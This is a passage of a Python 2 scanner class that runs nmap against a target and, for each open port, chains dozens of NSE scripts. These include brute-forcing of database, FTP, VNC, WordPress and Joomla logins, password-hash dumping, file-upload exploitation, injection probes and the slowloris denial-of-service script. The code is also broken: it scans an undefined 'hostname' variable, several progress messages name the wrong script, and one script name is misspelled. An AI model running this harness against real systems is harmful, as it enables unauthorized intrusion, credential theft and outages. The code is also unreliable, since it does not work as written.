        while self.nma.still_scanning():
            self.nma.wait(5)
        
    def scanningNmapUnix(self, ip):
    
        print 'Scannning NMAP Unix....................'
    
        # Check what time the scan started
        t1 = datetime.now()
        
        self.nm.scan(ip, arguments="-A -sV -p21,22,80,8080,443,5432,3306,27017,55553,1241,9160,5900")

        print self.nm.scaninfo()
        print self.nm.all_hosts()

        host = self.nm.all_hosts()[0]
        print 'Host: ' + host
        #print self.nm[host]['status']
        #print self.nm[host]['tcp']

        for port in self.nm[host]['tcp']:
            print 'Port {0} --> {1}'.format(port,self.nm[host]['tcp'][port]['state'])
            
            #mysql
            if (port==3306) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking MYSQL port with nmap scripts......'
                #scripts for mysql:3306 open
                print 'Checking mysql-audit.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script=/usr/share/nmap/scripts/mysql-audit.nse",callback=callbackMySql)
                self.scanning()
                print 'Checking mysql-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script=/usr/share/nmap/scripts/mysql-brute.nse",callback=callbackMySql)
                self.scanning()
                print 'Checking mysql-databases.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script=/usr/share/nmap/scripts/mysql-databases.nse",callback=callbackMySql)
                self.scanning()
                print 'Checking mysql-databases.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script=/usr/share/nmap/scripts/mysql-dump-hashes.nse",callback=callbackMySql)
                self.scanning()
                print 'Checking mysql-dump-hashes.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script=/usr/share/nmap/scripts/mysql-empty-password.nse",callback=callbackMySql)
                self.scanning()
                print 'Checking mysql-enum.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script=/usr/share/nmap/scripts/mysql-enum.nse",callback=callbackMySql)
                self.scanning()
                print 'Checking mysql-info.nse".....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script=/usr/share/nmap/scripts/mysql-info.nse",callback=callbackMySql)
                self.scanning()
                print 'Checking mysql-query.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script=/usr/share/nmap/scripts/mysql-query.nse",callback=callbackMySql)
                self.scanning()
                print 'Checking mysql-users.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script=/usr/share/nmap/scripts/mysql-users.nse",callback=callbackMySql)
                self.scanning()
                print 'Checking mysql-variables.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script=/usr/share/nmap/scripts/mysql-variables.nse",callback=callbackMySql)
                self.scanning()
                print 'Checking mysql-vuln-cve2012-2122.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script=/usr/share/nmap/scripts/mysql-vuln-cve2012-2122.nse",callback=callbackMySql)
                self.scanning()
            
            #FTP
            if (port==21) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking ftp port with nmap scripts......'
                #scripts for ftp:21 open
                print 'Checking ftp-anon.nse .....'
                self.nma.scan(hostname,arguments="-A -sV -p21 --script=/usr/share/nmap/scripts/ftp-anon.nse",callback=callbackFTP)
                self.scanning()
                print 'Checking ftp-bounce.nse  .....'
                self.nma.scan(hostname,arguments="-A -sV -p21 --script=/usr/share/nmap/scripts/ftp-bounce.nse",callback=callbackFTP)
                self.scanning()
                print 'Checking ftp-brute.nse  .....'
                self.nma.scan(hostname,arguments="-A -sV -p21 --script=/usr/share/nmap/scripts/ftp-brute.nse",callback=callbackFTP)
                self.scanning()
                print 'Checking ftp-libopie.nse  .....'
                self.nma.scan(hostname,arguments="-A -sV -p21 --script=/usr/share/nmap/scripts/ftp-libopie.nse",callback=callbackFTP)
                self.scanning()
                print 'Checking ftp-proftpd-backdoor.nse  .....'
                self.nma.scan(hostname,arguments="-A -sV -p21 --script=/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse",callback=callbackFTP)
                self.scanning()
                print 'Checking ftp-vsftpd-backdoor.nse   .....'
                self.nma.scan(hostname,arguments="-A -sV -p21 --script=/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse",callback=callbackFTP)
                self.scanning()
            
            #vnc
            if (port==5900) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking VNC port with nmap scripts......'
                #scripts for vnc:5900 open
                print 'Checking vnc-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p5900 --script=/usr/share/nmap/scripts/vnc-brute.nse",callback=callbackVNC)
                self.scanning()
                print 'Checking vnc-info.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p5900 --script=/usr/share/nmap/scripts/vnc-info.nse",callback=callbackVNC)
                self.scanning()
                
            #postgres
            if (port==5432) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking POSTGRES port with nmap scripts......'
                #scripts for postgres:5432 open
                print 'Checking pgsql-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p5432 --script=/usr/share/nmap/scripts/pgsql-brute.nse",callback=callbackPostgres)
                self.scanning()
                
            #mongodb
            if (port==27017) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking MONGODB port with nmap scripts......'
                #scripts for mondogb:27017 open
                print 'Checking mongodb-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p27017 --script=/usr/share/nmap/scripts/mongodb-brute.nse",callback=callbackMongoDB)
                self.scanning()
                print 'Checking mongodb-databases.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p27017 --script=/usr/share/nmap/scripts/mongodb-databases.nse",callback=callbackMongoDB)
                self.scanning()
                print 'Checking mongodb-info.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p27017 --script=/usr/share/nmap/scripts/mongodb-info.nse",callback=callbackMongoDB)
                self.scanning()
                
            #cassandra
            if (port==9160) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking CASSANDRA port with nmap scripts......'
                #scripts for cassandra:9160 open
                print 'Checking cassandra-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p9160 --script=/usr/share/nmap/scripts/cassandra-brute.nse",callback=callbackCassandra)
                self.scanning()
                print 'Checking cassandra-info.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p9160 --script=/usr/share/nmap/scripts/cassandra-info.nse",callback=callbackCassandra)
                self.scanning()
            
            #ssl
            if (port==443) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking SSL port with nmap scripts......'
                #scripts for ssl:443 open
                print 'Checking ssl-cert.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p443 --script=/usr/share/nmap/scripts/ssl-cert.nse",callback=callbackSSL)
                self.scanning()
                print 'Checking ssl-date.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p443 --script=/usr/share/nmap/scripts/ssl-date.nse",callback=callbackSSL)
                self.scanning()
                print 'Checking ssl-enum-ciphers.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p443 --script=/usr/share/nmap/scripts/ssl-enum-ciphers.nse",callback=callbackSSL)
                self.scanning()
                print 'Checking ssl-google-cert-catalog.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p443 --script=/usr/share/nmap/scripts/ssl-google-cert-catalog.nse",callback=callbackSSL)
                self.scanning()
                print 'Checking ssl-known-key.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p443 --script=/usr/share/nmap/scripts/ssl-known-key.nse",callback=callbackSSL)
                self.scanning()
                print 'Checking sslv2.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p443 --script=/usr/share/nmap/scripts/sslv2.nse",callback=callbackSSL)
                self.scanning()
                
            #ssh
            if (port==22) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking SSH port with nmap scripts......'
                #scripts for SSH:22 open
                print 'Checking ssh-hostkey.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p22 --script=/usr/share/nmap/scripts/ssh-hostkey.nse",callback=callbackSSH)
                self.scanning()
                print 'Checking ssh2-enum-algos.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p22 --script=/usr/share/nmap/scripts/ssh2-enum-algos.nse",callback=callbackSSH)
                self.scanning()
                print 'Checking sshv1.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p22 --script=/usr/share/nmap/scripts/sshv1.nse",callback=callbackSSH)
                self.scanning()
                
            #metaexploit
            if (port==55553) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking METAEXPLOIT port with nmap scripts......'
                #scripts for metaexploit:55553 open
                print 'Checking metasploit-info.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p55553 --script=/usr/share/nmap/scripts/metasploit-info.nse",callback=callbackMetaExploit)
                self.scanning()
                print 'Checking metasploit-msgrpc-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p55553 --script=/usr/share/nmap/scripts/metasploit-msgrpc-brute.nse",callback=callbackMetaExploit)
                self.scanning()
                print 'Checking metasploit-xmlrpc-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p55553 --script=/usr/share/nmap/scripts/metasploit-xmlrpc-brute.nse",callback=callbackMetaExploit)
                self.scanning()
                
            #nessus
            if (port==1241) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking NESSUS port with nmap scripts......'
                #scripts for nessus:1241 open
                print 'Checking netbus-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p1241 --script=/usr/share/nmap/scripts/netbus-brute.nse",callback=callbackNessus)
                self.scanning()
                print 'Checking nessus-xmlrpc-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p1241 --script=/usr/share/nmap/scripts/nessus-xmlrpc-brute.nse",callback=callbackNessus)
                self.scanning()
                
            #http
            if (port==80 or port==8080) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking HTTP port with nmap scripts......'
                #scripts for http:80 open
                print 'Obtain Hosts on IP hostmap-bfk.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/hostmap-bfk.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking dns-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/dns-brute.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-adobe-coldfusion-apsa1301.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-adobe-coldfusion-apsa1301.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-affiliate-id.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-affiliate-id.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-apache-negotiation.nse.....'
                self.nma.scan(hostname,arguments="-A -sS -p80 --script=/usr/share/nmap/scripts/http-apache-negotiation.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-auth-finder.nse....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-auth-finder.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-auth.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-auth.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-awstatstotals-exec.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-awstatstotals-exec.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-axis2-dir-traversal.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-axis2-dir-traversal.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-backup-finder.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-backup-finder.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-barracuda-dir-traversal.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-barracuda-dir-traversal.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-barracuda-dir-traversal.nse....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-brute.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-cakephp-version.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-cakephp-version.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-chrono.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-chrono.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-coldfusion-subzero.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-coldfusion-subzero.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-comments-displayer.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-comments-displayer.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-config-backup.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-config-backup.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-cors.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-cors.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-date.nse....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-date.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-default-accounts.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-default-accounts.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-domino-enum-passwords.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-domino-enum-passwords.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-drupal-enum-users.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-drupal-enum-users.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-drupal-modules.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-drupal-modules.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-email-harvest.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-email-harvest.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-enum.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-enum.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-exif-spider.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-exif-spider.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-favicon.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-favicon.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-fileupload-exploiter.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-fileupload-exploiter.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-form-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-form-brute.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-form-fuzzer.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-form-fuzzer.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-frontpage-login.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-frontpage-login.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-generator.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-generator.nse",callback=callbackHTTP)
                self.scanning()
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-git.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-gitweb-projects-enum.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-gitweb-projects-enum.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-google-malware.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-google-malware.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-grep.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-grep.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-headers.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-headers.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-huawei-hg5xx-vuln.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-huawei-hg5xx-vuln.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-icloud-findmyiphone.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-icloud-findmyiphone.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-icloud-sendmsg.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-icloud-sendmsg.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-iis-webdav-vuln.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-iis-webdav-vuln.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-joomla-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-joomla-brute.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-litespeed-sourcecode-download.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-litespeed-sourcecode-download.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-majordomo2-dir-traversal.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-majordomo2-dir-traversal.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-malware-host.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-malware-host.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-method-tamper.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-method-tamper.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-methods.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-methods.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-open-proxy.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-open-proxy.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-open-redirect.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-open-redirect.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-passwd.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-passwd.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-php-version.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-php-version.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-phpmyadmin-dir-traversal.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-phpmyadmin-dir-traversal.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking netbus-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-phpself-xss.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-proxy-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-proxy-brute.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-put.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-put.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-qnap-nas-info.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-qnap-nas-info.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-rfi-spider.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-rfi-spider.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-robots.txt.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-robots.txt.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-robtex-reverse-ip.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-robtex-reverse-ip.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-robtex-shared-ns.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-robtex-shared-ns.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-sitemap-generator.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-sitemap-generator.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-slowloris-check.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-slowloris-check.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-slowloris.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-slowloris.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-sql-injection.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-sql-injection.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking hhttp-stored-xss.nse....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/hhttp-stored-xss.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-title.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-title.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-tplink-dir-traversal.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-tplink-dir-traversal.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-trace.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-trace.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-traceroute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-traceroute.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-unsafe-output-escaping.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-unsafe-output-escaping.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-userdir-enum.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-userdir-enum.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-vhosts.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-vhosts.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-virustotal.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-virustotal.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-vlcstreamer-ls.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-vlcstreamer-ls.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-vmware-path-vuln.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-vmware-path-vuln.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-vuln-cve2009-3960.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-vuln-cve2009-3960.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-vuln-cve2010-0738.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-vuln-cve2010-0738.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-vuln-cve2010-2861.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-vuln-cve2010-2861.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-vuln-cve2011-3192.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-vuln-cve2011-3192.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-vuln-cve2011-3368.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-vuln-cve2011-3368.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-vuln-cve2012-1823.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-vuln-cve2012-1823.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-vuln-cve2013-0156.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-vuln-cve2013-0156.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-waf-detect.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-waf-detect.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-waf-fingerprint.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-waf-fingerprint.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-wordpress-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-wordpress-brute.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-wordpress-enum.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-wordpress-enum.nse",callback=callbackHTTP)
                self.scanning()
                print 'Checking http-wordpress-plugins.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p80 --script=/usr/share/nmap/scripts/http-wordpress-plugins.nse",callback=callbackHTTP)
                self.scanning()
                
        # Checking the time again
        t2 = datetime.now()

        # Calculates the difference of time, to see how long it took to run the script
        total =  t2 - t1

        # Printing the information to screen
        print 'Scanning Completed in: ', total

    def scanningNmapWindows(self, ip):
    
        print 'Scannning NMAP Windows....................'
    
        # Check what time the scan started
        t1 = datetime.now()
        
        self.nm.scan(ip, arguments="-A -sT -p21,22,80,8080,443,5432,3306,27017,55553,1241,9160,5900")

        print self.nm.scaninfo()
        print self.nm.all_hosts()
    
        host = self.nm.all_hosts()[0]
        print 'Host: ' + host
        #print self.nm[host]['status']
        #print self.nm[host]['tcp']

        for port in self.nm[host]['tcp']:
            print 'Port {0} --> {1}'.format(port,self.nm[host]['tcp'][port]['state'])
            
            #mysql
            if (port==3306) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking MYSQL port with nmap scripts......'
                #scripts for mysql:3306 open
                print 'Checking mysql-audit.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script mysql-audit.nse",callback=callbackMySql)
                self.scanning()
                print 'Checking mysql-brute.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script mysql-brute.nse",callback=callbackMySql)
                self.scanning()
                print 'Checking mysql-databases.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script mysql-databases.nse",callback=callbackMySql)
                self.scanning()
                print 'Checking mysql-databases.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script mysql-dump-hashes.nse",callback=callbackMySql)
                self.scanning()
                print 'Checking mysql-dump-hashes.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script mysql-empty-password.nse",callback=callbackMySql)
                self.scanning()
                print 'Checking mysql-enum.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script mysql-enum.nse",callback=callbackMySql)
                self.scanning()
                print 'Checking mysql-info.nse".....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script mysql-info.nse",callback=callbackMySql)
                self.scanning()
                print 'Checking mysql-query.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script mysql-query.nse",callback=callbackMySql)
                self.scanning()
                print 'Checking mysql-users.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script mysql-users.nse",callback=callbackMySql)
                self.scanning()
                print 'Checking mysql-variables.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script mysql-variables.nse",callback=callbackMySql)
                self.scanning()
                print 'Checking mysql-vuln-cve2012-2122.nse.....'
                self.nma.scan(hostname,arguments="-A -sV -p3306 --script mysql-vuln-cve2012-2122.nse",callback=callbackMySql)
                self.scanning()
            
            #FTP
            if (port==21) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking ftp port with nmap scripts......'
                #scripts for ftp:21 open
                print 'Checking ftp-anon.nse .....'
                self.nma.scan(hostname,arguments="-A -sV -p21 --script ftp-anon.nse",callback=callbackFTP)
                self.scanning()
                print 'Checking ftp-bounce.nse  .....'
                self.nma.scan(hostname,arguments="-A -sV -p21 --script ftp-bounce.nse",callback=callbackFTP)
                self.scanning()
